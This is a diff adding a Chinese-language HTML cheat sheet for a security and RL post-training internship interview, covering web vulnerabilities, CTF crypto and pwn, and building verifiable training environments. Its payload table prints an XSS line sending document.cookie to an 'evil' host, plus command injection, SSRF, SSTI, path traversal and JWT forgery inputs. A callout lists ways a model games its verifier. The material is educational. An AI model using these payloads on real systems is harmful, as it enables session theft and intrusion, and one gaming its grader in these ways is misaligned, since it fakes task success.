@@ -1,0 +1,327 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>安全知识图谱 · 智谱实习面试速览</title>
+<style>
+:root{
+  --bg:#f7f8fa; --card:#ffffff; --ink:#1a1d23; --muted:#5b6472; --line:#e2e6ec;
+  --accent:#3b5bdb; --accent2:#0ca678; --warn:#e8590c; --danger:#e03131; --soft:#eef2ff; --purple:#7048c4;
+}
+@media (prefers-color-scheme: dark){
+  :root{ --bg:#0f1216; --card:#171b21; --ink:#e8ebf0; --muted:#9aa4b2; --line:#2a303a;
+    --accent:#748ffc; --accent2:#38d9a9; --warn:#ffa94d; --danger:#ff8787; --soft:#1b2130; --purple:#b498ff; }
+}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;
+  line-height:1.7;font-size:16px}
+.wrap{max-width:1080px;margin:0 auto;padding:24px 18px 80px}
+header{padding:24px 0 8px}
+h1{font-size:26px;margin:0 0 6px}
+h2{font-size:21px;margin:40px 0 12px;padding-top:10px;border-top:2px solid var(--line)}
+h3{font-size:17px;margin:22px 0 8px;color:var(--accent)}
+p{margin:8px 0}
+.sub{color:var(--muted);font-size:15px}
+.grid{display:grid;gap:14px}
+.g2{grid-template-columns:repeat(auto-fit,minmax(300px,1fr))}
+.g3{grid-template-columns:repeat(auto-fit,minmax(230px,1fr))}
+.card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px 18px}
+.card h4{margin:0 0 6px;font-size:15px}
+.tag{display:inline-block;font-size:12px;padding:2px 9px;border-radius:20px;background:var(--soft);color:var(--accent);margin:0 4px 4px 0}
+.tag.g{background:rgba(12,166,120,.14);color:var(--accent2)}
+.tag.w{background:rgba(232,89,12,.14);color:var(--warn)}
+.tag.d{background:rgba(224,49,49,.14);color:var(--danger)}
+table{width:100%;border-collapse:collapse;font-size:14px;margin:10px 0}
+th,td{border:1px solid var(--line);padding:8px 10px;text-align:left;vertical-align:top}
+th{background:var(--soft)}
+.flow{display:flex;flex-wrap:wrap;align-items:stretch;gap:10px;margin:12px 0}
+.step{flex:1 1 150px;min-width:140px;background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px}
+.step .n{font-size:12px;color:var(--muted)}
+.step b{display:block;margin:2px 0 4px}
+.arrow{align-self:center;color:var(--muted);font-weight:700;padding:0 2px}
+.scroll{overflow-x:auto}
+code{background:var(--soft);padding:1px 6px;border-radius:5px;font-size:13.5px;
+  font-family:"SF Mono",ui-monospace,Menlo,Consolas,monospace}
+.fx{font-family:"SF Mono",ui-monospace,Menlo,Consolas,monospace;font-size:14px;background:var(--card);
+  border:1px solid var(--line);border-left:3px solid var(--purple);border-radius:0 8px 8px 0;
+  padding:10px 14px;margin:10px 0;overflow-x:auto;white-space:pre;line-height:1.6}
+.fx .c{color:var(--muted)}
+.callout{border-left:4px solid var(--accent);background:var(--soft);padding:10px 14px;border-radius:0 8px 8px 0;margin:12px 0;font-size:14.5px}
+.callout.g{border-color:var(--accent2)}
+.callout.w{border-color:var(--warn)}
+nav{position:sticky;top:0;background:var(--bg);padding:10px 0;border-bottom:1px solid var(--line);
+  font-size:13.5px;z-index:5;display:flex;flex-wrap:wrap;gap:6px}
+nav a{color:var(--accent);text-decoration:none;padding:3px 8px;border:1px solid var(--line);border-radius:16px;white-space:nowrap}
+svg{max-width:100%;height:auto;display:block}
+.legend{font-size:13px;color:var(--muted);margin-top:6px}
+ul{margin:6px 0;padding-left:20px}li{margin:3px 0}
+.small{font-size:13.5px;color:var(--muted)}
+</style>
+</head>
+<body>
+<div class="wrap">
+<header>
+<h1>安全知识图谱 · 面试速览</h1>
+<p class="sub">智谱实习面试用。项目要把网络安全推理和高阶代码能力内化进 GLM。这一页把你不熟的安全知识画成图、配上公式，核心流程给结构，关键部分展开。文字细节看同目录 04、05、09、10 文档。</p>
+</header>
+
+<nav>
+<a href="#map">全景</a>
+<a href="#web">Web 漏洞</a>
+<a href="#crypto">密码公式</a>
+<a href="#ctf">CTF 题型</a>
+<a href="#pwn">Pwn 内存</a>
+<a href="#pipe">题→训练环境</a>
+<a href="#post">后训练</a>
+<a href="#rl">RL 公式</a>
+<a href="#sao">GRPO vs SAO</a>
+<a href="#recall">记忆 vs 实操</a>
+</nav>
+
+<h2 id="map">一、面试全景：你的强项和落差</h2>
+<div class="grid g2">
+  <div class="card">
+    <h4>你的强项（用它开路）</h4>
+    <span class="tag g">Agent / Harness 开发</span>
+    <span class="tag g">可验证环境</span>
+    <span class="tag g">轨迹分析与 debug</span>
+    <span class="tag g">手工解过安全题</span>
+    <p class="small">pi 与 ale_claw 实操、root cause 模型与 harness 工具协议不匹配、脱壳+已知明文攻击+逆算法+流量取证。</p>
+  </div>
+  <div class="card">
+    <h4>你的落差（诚实承认，讲清理解到哪）</h4>
+    <span class="tag d">没独立训过模型</span>
+    <span class="tag w">RLHF / 后训练</span>
+    <span class="tag w">安全基础</span>
+    <span class="tag w">底层算子优化</span>
+    <p class="small">落差可补：你在训练最缺原料的上游（环境、轨迹、奖励）。见文档 08。</p>
+  </div>
+</div>
+<div class="callout g"><b>一句桥：</b>把安全推理内化进模型，第一步就得有大量可验证的安全训练环境和高质量轨迹，这恰恰是我 agent 和 harness 经验能立刻上手的地方，不必先会调 loss。</div>
+
+<h2 id="web">二、Web 漏洞：根因、载荷、修复</h2>
+<p class="sub">绝大多数 Web 漏洞是同一件事：程序把"数据"当成了"指令或结构"，攻击者控制的输入越过数据边界，进入了某个解释器的语法层。</p>
+<div class="scroll">
+<svg viewBox="0 0 900 200" role="img" aria-label="漏洞根因：数据越界进入解释器">
+  <rect x="10" y="80" width="150" height="60" rx="8" fill="var(--soft)" stroke="var(--line)"/>
+  <text x="85" y="106" text-anchor="middle" font-size="14" fill="var(--ink)">攻击者输入</text>
+  <text x="85" y="126" text-anchor="middle" font-size="12" fill="var(--muted)">本应是「数据」</text>
+  <line x1="160" y1="110" x2="235" y2="110" stroke="var(--muted)" stroke-width="2" marker-end="url(#a)"/>
+  <rect x="240" y="70" width="170" height="80" rx="8" fill="var(--card)" stroke="var(--danger)" stroke-width="2"/>
+  <text x="325" y="98" text-anchor="middle" font-size="13" fill="var(--ink)">拼接 / 无边界</text>
+  <text x="325" y="118" text-anchor="middle" font-size="12" fill="var(--muted)">数据和代码同处</text>
+  <text x="325" y="134" text-anchor="middle" font-size="12" fill="var(--muted)">一个字符串</text>
+  <line x1="410" y1="110" x2="485" y2="110" stroke="var(--muted)" stroke-width="2" marker-end="url(#a)"/>
+  <rect x="490" y="50" width="200" height="120" rx="8" fill="var(--soft)" stroke="var(--line)"/>
+  <text x="590" y="76" text-anchor="middle" font-size="13" fill="var(--accent)">解释器把输入当语法</text>
+  <text x="590" y="100" text-anchor="middle" font-size="12" fill="var(--muted)">SQL 解析器 → SQLi</text>
+  <text x="590" y="118" text-anchor="middle" font-size="12" fill="var(--muted)">浏览器 HTML/JS → XSS</text>
+  <text x="590" y="136" text-anchor="middle" font-size="12" fill="var(--muted)">shell → 命令注入</text>
+  <text x="590" y="154" text-anchor="middle" font-size="12" fill="var(--muted)">模板引擎 → SSTI</text>
+  <line x1="690" y1="110" x2="765" y2="110" stroke="var(--muted)" stroke-width="2" marker-end="url(#a)"/>
+  <rect x="770" y="80" width="120" height="60" rx="8" fill="var(--card)" stroke="var(--accent2)" stroke-width="2"/>
+  <text x="830" y="106" text-anchor="middle" font-size="13" fill="var(--ink)">修复</text>
+  <text x="830" y="126" text-anchor="middle" font-size="11.5" fill="var(--muted)">让数据待在数据位</text>
+  <defs><marker id="a" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+</svg>
+</div>
+
+<h3>常见漏洞：一句原理 + 载荷 + 修复</h3>
+<div class="scroll"><table>
+<tr><th>漏洞</th><th>最小载荷示例</th><th>根因 / 修复</th></tr>
+<tr><td>SQL 注入</td><td><code>name=' OR '1'='1</code> 使 WHERE 恒真；<code>admin'--</code> 注释掉密码校验</td><td>拼接构造 SQL；用参数化查询</td></tr>
+<tr><td>XSS</td><td><code>&lt;script&gt;fetch('//evil/'+document.cookie)&lt;/script&gt;</code> 偷会话</td><td>未按上下文编码；输出编码 + CSP + HttpOnly</td></tr>
+<tr><td>命令注入</td><td><code>host=8.8.8.8; cat /etc/passwd</code></td><td>把输入交给 shell；用数组传参不过 shell</td></tr>
+<tr><td>SSRF</td><td><code>url=http://169.254.169.254/latest/meta-data/</code> 读云凭证</td><td>无条件请求用户 URL；白名单 + 校验解析 IP</td></tr>
+<tr><td>SSTI</td><td><code>{{7*7}}</code> 回显 49 → <code>{{''.__class__.__mro__[1].__subclasses__()}}</code></td><td>输入拼进模板；数据走参数不拼模板</td></tr>
+<tr><td>路径穿越</td><td><code>file=../../../../etc/passwd</code></td><td>输入进文件路径；白名单映射 + 规范化校验</td></tr>
+<tr><td>反序列化</td><td>Java <code>readObject</code> gadget 链；Python <code>pickle.loads</code>（见文档 10）</td><td>反序列化不可信数据；用 JSON/safetensors</td></tr>
+<tr><td>IDOR 越权</td><td><code>GET /order?id=1002</code> 看别人订单</td><td>只认证不授权；每次校验资源归属</td></tr>
+<tr><td>JWT</td><td><code>alg:none</code> 去签名改 payload；RS256→HS256 用公钥当密钥伪造</td><td>不校验算法；固定并强制校验算法 + 强密钥</td></tr>
+</table></div>
+<div class="callout"><b>OWASP Top 10（2021）：</b>A01 访问控制失效 · A02 加密失效 · A03 注入 · A04 不安全设计 · A05 配置错误 · A06 过时组件 · A07 认证失效 · A08 软件与数据完整性失效（含不安全反序列化、供应链） · A09 日志监控失效 · A10 SSRF。</div>
+
+<h2 id="crypto">三、密码题的公式（CTF 考误用，不考硬破强算法）</h2>
+
+<h3>异或加密与已知明文攻击（你解 ghidra_malware 用的）</h3>
+<div class="fx">P ⊕ K = C          <span class="c">明文异或密钥得密文</span>
+C ⊕ K = P          <span class="c">密文异或密钥还原明文（对称可逆）</span>
+P ⊕ C = K          <span class="c">★关键：已知一段明文和对应密文，异或即得密钥</span>
+
+<span class="c">条件：已知明文长度 ≥ 密钥长度（重复异或时）。</span>
+<span class="c">实例：已知配置头 "BEACON01185.141."(16B) ⊕ 密文头(16B) = 16B 密钥</span></div>
+
+<h3>RSA 及其常见弱点</h3>
+<div class="fx">n = p·q          φ(n) = (p-1)(q-1)          e·d ≡ 1 (mod φ(n))
+加密: c = m^e mod n            解密: m = c^d mod n
+<span class="c">私钥 d 需要 φ(n)，而 φ(n) 需要分解 n = p·q</span></div>
+<div class="scroll"><table>
+<tr><th>弱点</th><th>为什么可解</th><th>解法</th></tr>
+<tr><td>n 太小 / p、q 太近</td><td>能分解 n 就能算出 d</td><td>factordb 查已知分解；Fermat 分解近素数</td></tr>
+<tr><td>小指数 e=3 且 m 小</td><td>m³ &lt; n 时未取模，c = m³</td><td>直接开三次方 m = ∛c</td></tr>
+<tr><td>共模 / 相关消息</td><td>同一 n 或相关明文加密</td><td>共模攻击、Franklin-Reiter</td></tr>
+</table></div>
+
+<h3>TEA 族识别（你解 newyear_keygen2 用的）</h3>
+<div class="fx"><span class="c">标准 TEA 每轮用魔数 DELTA 推进：</span>
+sum += DELTA;  DELTA = 0x9E3779B9   <span class="c">(黄金分割相关)</span>
+<span class="c">逆向诀窍：在二进制里搜到 DELTA 常量，基本就确认是 TEA 族。</span>
+<span class="c">这道题是 TEA 变体，DELTA 改成 0xB979379E，在偏移 11839 找到 → 确认算法族。</span></div>
+<div class="callout g">其它 CTF crypto 高频弱点：ECB 模式（相同明文块→相同密文块，可分块重排）、nonce 复用（CTR 复用可异或消去密钥流，ECDSA 复用可解出私钥）、弱随机数（Mersenne Twister 可恢复状态预测输出）。</div>
+
+<h2 id="ctf">四、CTF 六大题型：拿到题先看什么</h2>
+<div class="grid g3">
+  <div class="card"><h4>Web</h4><span class="tag">burp</span><span class="tag">sqlmap</span><span class="tag">ffuf</span>
+    <p class="small">考漏洞识别利用。先看源码接口、cookie、源码泄露（.git/.bak）。flag 在数据库或服务器文件。</p></div>
+  <div class="card"><h4>Pwn 二进制利用</h4><span class="tag">pwntools</span><span class="tag">gdb+pwndbg</span>
+    <p class="small">门槛最高、最长程。内存破坏劫持控制流。见下方内存图。flag 是拿 shell 后 <code>cat /flag</code>。</p></div>
+  <div class="card"><h4>Reverse 逆向</h4><span class="tag">Ghidra/IDA</span><span class="tag">angr</span>
+    <p class="small">读懂无源码程序、还原校验逻辑。你解的 keygen/crackme 就是这类。</p></div>
+  <div class="card"><h4>Crypto 密码</h4><span class="tag">SageMath</span><span class="tag">factordb</span>
+    <p class="small">考误用弱点（见上一节公式）。你的已知明文攻击属于这类。</p></div>
+  <div class="card"><h4>Forensics 取证</h4><span class="tag">Wireshark</span><span class="tag">volatility</span>
+    <p class="small">从 pcap/内存/磁盘挖信息。你的 NetSupport RAT 流量取证是这类，靠明文 DNS 破案。</p></div>
+  <div class="card"><h4>Misc 杂项</h4><span class="tag">CyberChef</span><span class="tag">binwalk</span>
+    <p class="small">编码解码、隐写、脚本交互、OSINT。一串看不懂的先怀疑编码。</p></div>
+</div>
+
+<h2 id="pwn">五、Pwn 内存模型与两阶段利用</h2>
+<div class="grid g2">
+<div class="card">
+<h4>进程内存布局</h4>
+<div class="scroll">
+<svg viewBox="0 0 340 240" role="img" aria-label="进程内存布局">
+  <text x="10" y="16" font-size="12" fill="var(--muted)">高地址</text>
+  <rect x="70" y="22" width="200" height="38" fill="var(--soft)" stroke="var(--line)"/>
+  <text x="170" y="45" text-anchor="middle" font-size="13">栈 stack ↓</text>
+  <rect x="70" y="60" width="200" height="28" fill="var(--card)" stroke="var(--danger)" stroke-width="2"/>
+  <text x="170" y="79" text-anchor="middle" font-size="12" fill="var(--danger)">返回地址（利用目标）</text>
+  <rect x="70" y="88" width="200" height="26" fill="var(--card)" stroke="var(--line)"/>
+  <text x="170" y="105" text-anchor="middle" font-size="12">局部变量 buf[]</text>
+  <rect x="70" y="124" width="200" height="32" fill="var(--soft)" stroke="var(--line)"/>
+  <text x="170" y="144" text-anchor="middle" font-size="13">堆 heap ↑</text>
+  <rect x="70" y="156" width="200" height="24" fill="var(--soft)" stroke="var(--line)"/>
+  <text x="170" y="172" text-anchor="middle" font-size="12">.data / .bss</text>
+  <rect x="70" y="180" width="200" height="24" fill="var(--soft)" stroke="var(--line)"/>
+  <text x="170" y="196" text-anchor="middle" font-size="12">.text 代码</text>
+  <text x="10" y="200" font-size="12" fill="var(--muted)">低地址</text>
+</svg>
+</div>
+<p class="small">栈溢出：往 <code>buf[]</code> 写超量数据，向高地址覆盖返回地址，改成想跳去的地址。</p>
+</div>
+<div class="card">
+<h4>为什么现代 pwn 是两阶段</h4>
+<div class="flow">
+  <div class="step"><span class="n">阶段一</span><b>信息泄露</b>绕 ASLR：泄露一个地址，算出基址</div>
+  <span class="arrow">→</span>
+  <div class="step"><span class="n">阶段二</span><b>ROP 劫持</b>绕 NX：串已有代码片段调 <code>system("/bin/sh")</code></div>
+</div>
+<table>
+<tr><th>缓解</th><th>绕过</th></tr>
+<tr><td>NX 数据不可执行</td><td>ROP 复用已有代码</td></tr>
+<tr><td>ASLR 地址随机</td><td>先泄露地址</td></tr>
+<tr><td>Canary 栈哨兵</td><td>泄露 canary 再写回</td></tr>
+<tr><td>PIE 代码也随机</td><td>泄露代码指针</td></tr>
+</table>
+<p class="small">一步错则全盘错，要维持跨步状态，这正是它作为长程 agentic 训练任务价值高的原因。</p>
+</div>
+</div>
+
+<h2 id="pipe">六、一道安全题怎么变成可打分的训练环境</h2>
+<p class="sub">这是岗位的核心工程，也是你 agent 经验的用武之地。三种可验证性由易到难。</p>
+<div class="scroll"><table>
+<tr><th>可验证层次</th><th>怎么判定</th><th>你解的题里的例子</th><th>作 RL 奖励</th></tr>
+<tr><td>Flag 精确匹配</td><td>输出和标准 flag 字符串比对</td><td>newyear_keygen2</td><td>最干净的 0/1</td></tr>
+<tr><td>状态检查</td><td>探测端口/文件/注册表进入某状态</td><td>tris_crackme（读注册表）</td><td>要写状态探针</td></tr>
+<tr><td>输出字段打分</td><td>按 schema 字段对错给连续分</td><td>ghidra_malware（15 字段）、pcap</td><td>字段级连续奖励</td></tr>
+</table></div>
+<div class="flow">
+  <div class="step"><span class="n">1</span><b>容器化隔离</b>锁依赖版本、网络隔离、可复现</div><span class="arrow">→</span>
+  <div class="step"><span class="n">2</span><b>flag 随机注入</b>实例化时生成，放到只有解出才能到的位置</div><span class="arrow">→</span>
+  <div class="step"><span class="n">3</span><b>verifier 隔离</b>精确匹配或状态探针，模型碰不到打分逻辑</div><span class="arrow">→</span>
+  <div class="step"><span class="n">4</span><b>轨迹可观测 + 每 episode 重置</b>记录用于信用分配和审计</div>
+</div>
+<h3>防猜 flag 的熵（为什么 flag 主体要随机）</h3>
+<div class="fx"><span class="c">flag 主体 = L 个字符, 每字符取自大小为 base 的字符集：</span>
+猜中概率 = base^(-L)          熵 = L · log2(base)  bits
+<span class="c">例：16 个 hex 字符 → 熵 = 16·4 = 64 bit，猜中概率 2^-64，可忽略。</span></div>
+<div class="callout w"><b>reward hacking 高发形态（要主动堵）：</b>直接 <code>grep flag</code>、猜 flag、以及最隐蔽的<b>打 verifier 本身</b>（子串匹配就把海量候选全打印命中、改 verifier 读结果的可写文件、状态检查只看端口有响应就随便起服务占住）。原则：让真正解题成为拿奖励的唯一低成本路径。</div>
+
+<h2 id="post">七、后训练全流程（岗位的正题）</h2>
+<p class="sub">把安全推理内化进模型，走的就是这条后训练管线。前沿做法是多阶段混合。</p>
+<div class="flow">
+  <div class="step"><span class="n">起点</span><b>预训练模型</b>会补全，但不按指令、不保证答案对</div><span class="arrow">→</span>
+  <div class="step"><span class="n">SFT 冷启动</span><b>模仿</b>(提示,标准答案)交叉熵，学格式和基本行为</div><span class="arrow">→</span>
+  <div class="step"><span class="n">RLVR</span><b>提能力</b>可验证环境自己解、成败当奖励做 RL，把决策写进权重</div><span class="arrow">→</span>
+  <div class="step"><span class="n">拒绝采样</span><b>回收</b>筛出解对的轨迹再 SFT</div><span class="arrow">→</span>
+  <div class="step"><span class="n">通用对齐</span><b>收口</b>RLHF/DPO 修风格与安全</div>
+</div>
+<div class="callout g"><b>顺序式 RL（GLM-5 报告的做法）：</b>推理 RL 打底 → agentic RL 叠自主规划 → 通用 RL 收口 → 跨阶段 on-policy 蒸馏防前面能力被后面训忘。安全推理内化在 agentic RL 那一段，用真实测试执行（Fail-to-Pass / Pass-to-Pass）当奖励。</div>
+
+<h2 id="rl">八、RL 的核心公式（讲准这几个就够）</h2>
+<h3>策略梯度与优势</h3>
+<div class="fx">∇J = E[ ∇log π(a|s) · A ]      <span class="c">提高高回报动作的概率</span>
+A = 回报 − 基线(baseline)         <span class="c">优势 = 这个动作比平均好多少</span></div>
+<h3>PPO：clip 与 KL 管的是两件事</h3>
+<div class="fx">r = π_new(a|s) / π_old(a|s)                       <span class="c">重要性采样比</span>
+L_clip = E[ min( r·A , clip(r, 1−ε, 1+ε)·A ) ]    <span class="c">clip：离本轮采样策略别太远（稳定）</span>
+reward_total = r_task − β · KL(π ‖ π_ref)          <span class="c">KL：离初始参考模型别太远（防丢通用能力/抗hack）</span></div>
+<h3>GRPO：用组内相对优势省掉 value model</h3>
+<div class="fx">对同一 prompt 采一组 G 个回答，各得奖励 r_1…r_G：
+A_i = ( r_i − mean(r) ) / std(r)     <span class="c">组内标准化，无需 critic</span>
+<span class="c">坑：一组全对或全错时 A_i 全为 0，该题这轮无梯度 → 需要课程/难度匹配</span></div>
+<h3>评估：pass@k</h3>
+<div class="fx">pass@k = 采 k 个答案至少一个通过的概率
+无偏估计: pass@k = 1 − C(n−c, k) / C(n, k)   <span class="c">n 个样本中 c 个正确</span>
+<span class="c">陷阱：RL 常提升 pass@1 但可能压低 pass@k（多样性下降）。</span>
+<span class="c">pass@1 涨而 pass@k 不涨 = 采样效率提高，不是能力边界扩展。</span></div>
+
+<h2 id="sao">九、GRPO 与 SAO：取舍怎么反转（唐杰系论文）</h2>
+<div class="scroll"><table>
+<tr><th></th><th>GRPO</th><th>SAO（arXiv 2607.07508，训 GLM-5.2）</th></tr>
+<tr><td>采样</td><td>每个 prompt 采一<b>组</b></td><td>每个 prompt 采<b>一条</b> rollout</td></tr>
+<tr><td>基线（算优势）</td><td>用组内平均，省掉 value model</td><td>没有组了，把 <b>value model 请回来</b></td></tr>
+<tr><td>稳定性</td><td>同步下够稳</td><td>严格<b>双侧 token 级裁剪</b>稳住异步</td></tr>
+<tr><td>适合</td><td>同步、离线固定题库、每题能廉价采一组</td><td>异步、长程、在线演化、环境只给单信号</td></tr>
+</table></div>
+<div class="callout g"><b>一句判断：</b>不是谁替代谁，是设定决定选择。当采样从"组"变成"单轨迹"，"要不要 value model"这个取舍就反过来了。异步加稀疏奖励一叠加，一个好 critic 反而更稳更省。这也和 credit assignment 那条线（去 value 的 GRPO 在稀疏奖励下 step 级估计不准）互相印证。用词准确：SAO 训的是 GLM-5.2（750B-A40B），不是首发 GLM-5。</div>
+
+<h2 id="recall">十、记忆清单 vs 需要实操的</h2>
+<div class="grid g2">
+<div class="card">
+<h4>今晚背下来就能用（记忆）</h4>
+<ul>
+<li>Web 漏洞根因一句话 + 载荷表 + OWASP Top 10</li>
+<li>密码公式：XOR 三式、RSA 四式、TEA 的 DELTA 识别法</li>
+<li>CTF 六题型各考什么、先看什么、常用工具</li>
+<li>Pwn 两阶段结构 + 四个缓解和绕过</li>
+<li>后训练管线五段 + 顺序式 RL</li>
+<li>RL 公式：策略梯度、PPO 的 clip vs KL、GRPO 组内优势、pass@k</li>
+<li>GRPO 省 critic、SAO 请回 critic 的取舍反转</li>
+<li>分布式四种并行、算子优化核心是内存带宽（FlashAttention）</li>
+<li>安全推理提升通用智能的三段链条（文档 09 第四节）</li>
+<li>前沿硬事实：Big Sleep 封 0day、XBOW 登顶、AIxCC、GPT-5 胜 93% 选手</li>
+</ul>
+</div>
+<div class="card">
+<h4>要有第一手体感（实操）</h4>
+<ul>
+<li><span class="tag g">已有</span>脱壳 + 已知明文攻击还原 XOR 密钥</li>
+<li><span class="tag g">已有</span>逆 crackme 还原注册码算法</li>
+<li><span class="tag g">已有</span>tshark 流量取证认家族</li>
+<li><span class="tag g">已有</span>接模型进 harness、debug 工具协议不匹配</li>
+<li><span class="tag g">已做</span>pickle 反序列化 RCE 拿 flag（文档 10，真解过）</li>
+<li><span class="tag w">可补</span>一道 picoCTF：strings/file → 反编译 → 求解</li>
+<li><span class="tag w">可补</span>读一个 pwntools 栈溢出脚本，理解打包地址和收发</li>
+<li><span class="tag w">概念即可</span>跑通一个最小 GRPO/PPO 脚本（TRL），知道 loss 和奖励怎么进去</li>
+</ul>
+</div>
+</div>
+<div class="callout"><b>面试策略：</b>记忆类答得利落显示你系统过了知识；实操类用你真解过的题举例（含文档 10 那道 AI 安全 pickle 题），把抽象概念落成有实感的东西。不会的题用诚实框架：承认边界 + 说怎么查证 + 接到你会的东西。</div>
+
+<p class="small" style="margin-top:30px;border-top:1px solid var(--line);padding-top:14px">配套文档：00 导航 · 01 背景定位 · 02 后训练 · 03 harness · 04 Web/CTF · 05 程序分析 · 06 问答 · 07 智谱前沿 · 08 从做agent到训模型 · 09 安全与代码RL前沿 · 10 CTF 实战 AI 安全入门题。</p>
+</div>
+</body>
+</html>
